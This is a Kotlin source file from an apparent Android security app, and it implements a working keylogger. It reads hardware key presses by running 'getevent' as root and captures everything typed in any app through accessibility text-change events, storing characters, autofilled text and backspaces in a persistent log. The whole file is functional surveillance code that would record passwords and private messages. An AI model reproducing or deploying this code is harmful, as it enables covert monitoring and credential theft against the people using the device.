package com.hamoon.uncleted.util

import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.hamoon.uncleted.data.SecurityPreferences
import kotlinx.coroutines.*
import java.io.InputStreamReader

/**
 * Hybrid Hardware and Virtual Keystroke Surveillance Logger.
 * Captures hardware keys (Power, Volume) via Linux input events and
 * software keyboard typing via accessibility event stream.
 */
object Keylogger {
    private const val TAG = "Keylogger"
    private var hardwareKeyJob: Job? = null
    private var keyloggerProcess: Process? = null

    fun start(context: Context) {
        if (hardwareKeyJob?.isActive == true) {
            Log.d(TAG, "Hardware key monitor is already active.")
            return
        }

        hardwareKeyJob = CoroutineScope(Dispatchers.IO).launch {
            Log.w(TAG, "Starting hardware input keylogger monitor...")
            EventLogger.log(context, "Keylogger service started.")

            try {
                keyloggerProcess = ProcessBuilder("su", "-c", "getevent -l").start()
                val reader = InputStreamReader(keyloggerProcess!!.inputStream)
                reader.use {
                    it.forEachLine { line ->
                        if (isActive) {
                            parseHardwareKeyLine(context, line)
                        } else {
                            return@forEachLine
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Hardware keylogger execution failed.", e)
            } finally {
                stop()
            }
        }
    }

    fun stop() {
        if (hardwareKeyJob?.isActive == true) {
            hardwareKeyJob?.cancel()
        }
        keyloggerProcess?.destroy()
        keyloggerProcess = null
        hardwareKeyJob = null
        Log.i(TAG, "Keylogger stopped.")
    }

    /**
     * Intercepts virtual keyboard inputs from Accessibility events.
     */
    fun recordAccessibilityEvent(context: Context, event: AccessibilityEvent) {
        if (!SecurityPreferences.isKeyloggerEnabled(context)) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val textList = event.text
            if (textList.isNotEmpty()) {
                val text = textList.firstOrNull()?.toString()
                if (!text.isNullOrEmpty()) {
                    val addedCount = event.addedCount
                    val removedCount = event.removedCount

                    // Distinguish single key typed vs bulk autofill vs backspace
                    if (addedCount == 1 && text.isNotEmpty()) {
                        val char = text.last()
                        SecurityPreferences.appendKeylogData(context, char.toString())
                    } else if (addedCount > 1) {
                        SecurityPreferences.appendKeylogData(context, "[$text]")
                    } else if (removedCount > 0 && addedCount == 0) {
                        SecurityPreferences.appendKeylogData(context, "[BACKSPACE]")
                    }
                }
            }
        }
    }

    /**
     * Parses physical button events from /dev/input/.
     */
    private fun parseHardwareKeyLine(context: Context, rawLine: String) {
        if (rawLine.contains("KEY_") && rawLine.contains("DOWN")) {
            val key = rawLine.substringAfter("KEY_").substringBefore(" ").trim()
            when (key) {
                "VOLUMEUP" -> SecurityPreferences.appendKeylogData(context, "[VOL_UP]")
                "VOLUMEDOWN" -> SecurityPreferences.appendKeylogData(context, "[VOL_DOWN]")
                "POWER" -> SecurityPreferences.appendKeylogData(context, "[POWER]")
                "ENTER" -> SecurityPreferences.appendKeylogData(context, "\n")
                "SPACE" -> SecurityPreferences.appendKeylogData(context, " ")
                else -> {
                    if (key.length == 1) {
                        SecurityPreferences.appendKeylogData(context, key)
                    }
                }
            }
        }
    }
}